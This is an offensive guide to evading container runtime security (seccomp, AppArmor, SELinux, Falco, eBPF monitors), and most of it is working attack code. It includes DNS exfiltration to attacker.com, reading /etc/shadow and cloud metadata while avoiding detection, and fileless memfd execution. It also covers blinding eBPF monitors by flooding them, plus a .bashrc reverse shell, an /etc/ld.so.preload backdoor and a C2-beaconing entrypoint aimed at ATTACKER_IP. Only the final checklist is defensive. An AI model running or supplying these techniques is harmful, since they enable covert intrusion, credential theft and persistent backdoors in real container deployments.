# Container Runtime Security Guide

> Techniques for understanding and evading container runtime security mechanisms including seccomp profiles, AppArmor policies, SELinux contexts, and runtime detection systems like Falco and Sysdig.

## 1. Seccomp Profile Analysis and Bypass

```bash
# Check current seccomp status
cat /proc/self/status | grep Seccomp
# Seccomp: 0 = disabled, 1 = strict, 2 = filter mode

# Dump the active seccomp filter (requires CAP_SYS_ADMIN or ptrace)
# Using seccomp-tools:
pip3 install seccomp-tools 2>/dev/null || \
  apt install -y seccomp-tools 2>/dev/null

# Enumerate allowed syscalls by testing each one
cat > test_syscalls.c << 'EOF'
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>

// Test critical syscalls for escape
struct syscall_test {
    long nr;
    const char *name;
};

struct syscall_test tests[] = {
    {SYS_mount, "mount"},
    {SYS_umount2, "umount"},
    {SYS_ptrace, "ptrace"},
    {SYS_clone, "clone"},
    {SYS_unshare, "unshare"},
    {SYS_pivot_root, "pivot_root"},
    {SYS_init_module, "init_module"},
    {SYS_finit_module, "finit_module"},
    {SYS_reboot, "reboot"},
    {SYS_setns, "setns"},
    {0, NULL}
};

int main() {
    for (int i = 0; tests[i].name; i++) {
        long ret = syscall(tests[i].nr, 0, 0, 0, 0, 0, 0);
        if (errno == EPERM) {
            printf("[BLOCKED] %s (seccomp or capability)\n", tests[i].name);
        } else {
            printf("[ALLOWED] %s (ret=%ld, errno=%d)\n", tests[i].name, ret, errno);
        }
    }
    return 0;
}
EOF
gcc -o test_syscalls test_syscalls.c && ./test_syscalls
```

## 2. AppArmor Profile Evasion

```bash
# Check if AppArmor is enforcing
cat /proc/self/attr/current
# Output: "docker-default (enforce)" or "unconfined"

# View the active AppArmor profile
cat /sys/kernel/security/apparmor/profiles | grep docker

# Common Docker default AppArmor restrictions:
# - Denies mount operations
# - Denies write to /proc and /sys
# - Denies access to kernel module loading
# - Restricts ptrace

# Bypass technique 1: Find writable proc entries
find /proc -writable 2>/dev/null | head -20
# /proc/self/oom_score_adj is often writable

# Bypass technique 2: Exploit allowed file operations
# AppArmor profiles often allow reading /proc/*/maps
# Use this for information gathering:
cat /proc/1/maps  # If hostPID is enabled
cat /proc/1/environ  # Environment variables of PID 1

# Bypass technique 3: Use allowed network operations
# AppArmor rarely restricts network syscalls
# Exfiltrate data via DNS or HTTP even if file access is restricted
python3 -c "
import socket, base64, os
data = base64.b64encode(open('/etc/hostname','rb').read()).decode()
# DNS exfiltration
socket.getaddrinfo(f'{data}.attacker.com', 80)
"
```

## 3. SELinux Context Manipulation

```bash
# Check SELinux status and context
getenforce
id -Z
ps -eZ | head

# Container typically runs as: system_u:system_r:container_t:s0:c1,c2
# container_t is restricted from:
# - Accessing host files (except labeled container_file_t)
# - Loading kernel modules
# - Modifying network configuration

# Find files accessible to container_t
sesearch --allow -s container_t -t container_file_t
sesearch --allow -s container_t | grep -E "(read|write|execute)"

# Bypass: Look for type transitions
sesearch --type_trans -s container_t

# Check for permissive domains (effectively disabled SELinux)
seinfo --permissive

# If spc_t (super privileged container) context is assigned:
# This bypasses all SELinux restrictions
# Check: id -Z shows spc_t instead of container_t
```

## 4. Runtime Detection Evasion (Falco)

```bash
# Falco monitors syscalls via eBPF/kernel module
# Common Falco rules detect:
# - Shell spawned in container
# - Sensitive file access (/etc/shadow, /etc/passwd)
# - Network tools (nmap, nc, curl to metadata)
# - Binary execution from /tmp

# Evasion technique 1: Use built-in shell features instead of binaries
# Instead of: cat /etc/shadow
# Use bash built-in:
while IFS= read -r line; do echo "$line"; done < /etc/shadow

# Instead of: curl http://metadata/...
# Use bash /dev/tcp:
exec 3<>/dev/tcp/169.254.169.254/80
echo -e "GET /latest/meta-data/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n" >&3
cat <&3

# Evasion technique 2: Avoid /tmp execution
# Copy binary to a non-monitored path
cp /tmp/exploit /var/cache/.hidden
chmod +x /var/cache/.hidden
/var/cache/.hidden

# Evasion technique 3: Use memfd_exec (fileless execution)
python3 << 'EOF'
import ctypes, os, base64

# Create anonymous file in memory (no disk artifact)
libc = ctypes.CDLL("libc.so.6")
fd = libc.memfd_create(b"", 0)

# Write payload to memory fd
payload = open("/tmp/exploit", "rb").read()
os.write(fd, payload)

# Execute from /proc/self/fd/N (no file path for Falco to match)
os.execve(f"/proc/self/fd/{fd}", ["exploit"], os.environ)
EOF
```

## 5. eBPF-Based Security Bypass

```python
# Modern runtime security (Falco, Tetragon, Tracee) uses eBPF
# Detect which eBPF programs are loaded

#!/usr/bin/env python3
import subprocess
import re

# List loaded eBPF programs
result = subprocess.run(['bpftool', 'prog', 'list'], capture_output=True, text=True)
print("Loaded eBPF programs:")
print(result.stdout)

# Identify security-related programs
security_indicators = ['falco', 'tetragon', 'tracee', 'cilium', 'security']
for line in result.stdout.split('\n'):
    for indicator in security_indicators:
        if indicator.lower() in line.lower():
            print(f"[DETECTED] Security eBPF program: {line.strip()}")
```

```bash
# Check for eBPF-based monitoring
bpftool prog list 2>/dev/null | grep -iE "(tracepoint|kprobe|raw_tp)"
cat /sys/kernel/debug/tracing/kprobe_events 2>/dev/null

# Evasion: Use syscalls not monitored by the eBPF program
# Most eBPF security tools monitor a subset of syscalls
# Test which are monitored by performing actions and checking alerts

# Evasion: Timing-based (eBPF programs have execution time limits)
# Flood with benign syscalls to cause eBPF ring buffer overflow
dd if=/dev/zero of=/dev/null bs=1 count=999999999 &
# While buffer is overwhelmed, perform malicious action
```

## 6. Namespace and Cgroup Evasion

```bash
# Understand container isolation boundaries
ls -la /proc/self/ns/
# Shows: cgroup, ipc, mnt, net, pid, user, uts namespaces

# Check cgroup constraints
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null
cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null

# Escape cgroup resource limits (if writable)
echo -1 > /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null

# PID namespace escape (if hostPID)
# Find and attach to host processes
ls /proc/*/cmdline 2>/dev/null | while read f; do
  pid=$(echo $f | cut -d/ -f3)
  cmd=$(cat $f 2>/dev/null | tr '\0' ' ')
  if echo "$cmd" | grep -qE "(sshd|dockerd|kubelet)"; then
    echo "Host process: PID=$pid CMD=$cmd"
  fi
done

# Network namespace escape (if hostNetwork)
# Full access to host network stack
ip addr show
ss -tlnp  # See all host listening ports
iptables -L -n  # View host firewall rules
```

## 7. Container Image Backdooring

```bash
# Modify container image to include persistent backdoor
# that evades runtime scanning

# Technique 1: Backdoor via .bashrc (triggers on exec)
cat >> /root/.bashrc << 'EOF'
# Reverse shell on interactive session
(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null
EOF

# Technique 2: LD_PRELOAD persistence
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    if (getenv("BACKDOOR_ACTIVE")) return;
    setenv("BACKDOOR_ACTIVE", "1", 1);
    if (fork() == 0) {
        setsid();
        execl("/bin/bash", "bash", "-c",
              "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL);
    }
}
EOF
gcc -shared -fPIC -o /usr/lib/libbackdoor.so /tmp/backdoor.c
echo "/usr/lib/libbackdoor.so" >> /etc/ld.so.preload

# Technique 3: Modify entrypoint in image layer
# Create a wrapper script
cat > /entrypoint-wrapper.sh << 'EOF'
#!/bin/bash
# Beacon to C2 silently
(curl -s https://attacker.com/beacon?h=$(hostname) &) 2>/dev/null
# Execute original entrypoint
exec /original-entrypoint.sh "$@"
EOF
chmod +x /entrypoint-wrapper.sh
```

## 8. Defense Assessment Checklist

```yaml
# Kubernetes security assessment - runtime controls audit
# Run from a security assessment pod or external tooling

# Check Pod Security Standards enforcement
apiVersion: v1
kind: Namespace
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
---
# Verify with:
# kubectl get ns -o json | jq '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'
```

```bash
# Runtime security posture assessment
echo "=== Container Runtime Security Assessment ==="

# 1. Seccomp
echo "[Seccomp] Status: $(cat /proc/self/status | grep Seccomp)"

# 2. AppArmor
echo "[AppArmor] Profile: $(cat /proc/self/attr/current 2>/dev/null)"

# 3. Capabilities
echo "[Caps] Effective: $(cat /proc/self/status | grep CapEff)"
echo "[Caps] Decoded: $(capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') 2>/dev/null)"

# 4. Read-only filesystem
touch /test_write 2>/dev/null && echo "[FS] Writable root" && rm /test_write || echo "[FS] Read-only root"

# 5. Network policies
# Check if egress is restricted
timeout 3 bash -c "echo >/dev/tcp/8.8.8.8/53" 2>/dev/null && \
  echo "[Net] Unrestricted egress" || echo "[Net] Egress filtered"

# 6. Service account
echo "[SA] Token mounted: $(ls /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo YES || echo NO)"
```
